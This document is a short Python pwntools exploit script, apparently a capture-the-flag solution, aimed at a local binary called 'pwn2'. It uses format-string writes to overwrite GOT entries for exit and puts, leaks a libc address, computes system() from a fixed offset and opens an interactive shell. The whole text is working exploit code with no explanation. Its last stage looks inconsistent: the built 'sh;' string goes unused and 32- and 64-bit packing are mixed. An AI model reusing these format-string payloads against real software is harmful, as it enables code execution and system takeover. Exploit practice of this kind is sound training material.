from pwn import *

#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
r = process("./pwn2")

#gdb.attach(r,'b*0x8048688')

#context.log_level = "debug"

fgets_got = 0x0804b010
puts_got = 0x0804b01c
exit_got = 0x0804b020

print r.recvuntil("input: ")

string=""
string+="%85c%16$hhn"
string+="%49c%17$hhn"

junk="a"*(36-len(string))

payload=""
payload+=string
payload+=junk
payload+=p32(exit_got)
payload+=p32(exit_got+0x1)
print len(payload)

r.sendline(payload)

print r.recv()

print r.recvuntil("input: ")

r.sendline("%2$p")
leak=r.recvline()
leak=leak.replace("\n","")
log.info("Leak -> %s",leak)
leak=int(leak,16)
system=leak-1658496
system=hex(system)

print r.recv()

print r.recvuntil("input: ")

s1=system[-2:]
s2=system[-4:-2]
s3=system[-6:-4]
s1=int(s1,16)

count1=s1
while(hex(count1)[-2:]!=s2):
    count1+=1

count2=count1

while(hex(count2)[-2:]!=s3):
    count2+=1

string="sh;"
string+="%"+str(s1)+"c"
string+="%34$hn"
string+="%"+str(count1-s1)+"c"
string+="%35$hhn"
string+="%"+str(count2-count1)+"c"
string+="%36$hhn"

random="%34$p %35$p %36$p"

junk="a"*(48-len(random))
payload=""
payload+=random
payload+=junk
payload+=p64(puts_got)
payload+=p64(puts_got+0x1)
payload+=p64(puts_got+0x2)

r.sendline(payload)
print r.recv()
r.interactive()